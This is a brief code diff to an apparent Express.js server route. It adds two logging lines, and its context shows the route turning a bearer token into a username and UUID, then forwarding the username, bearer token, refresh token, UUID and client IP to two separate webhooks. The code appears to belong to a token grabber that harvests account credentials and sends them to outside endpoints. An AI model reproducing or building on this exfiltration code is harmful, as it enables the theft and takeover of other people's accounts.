@@ -36,6 +36,8 @@ app.get('/', async (req, res) => {
         const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
+        console.log(username)
+        console.log(uuid)
         const ip = clientIp
         postToWebhook(username, bearerToken, uuid, ip, refreshToken)
 	postToWebhook2(username, bearerToken, uuid, ip, refreshToken)
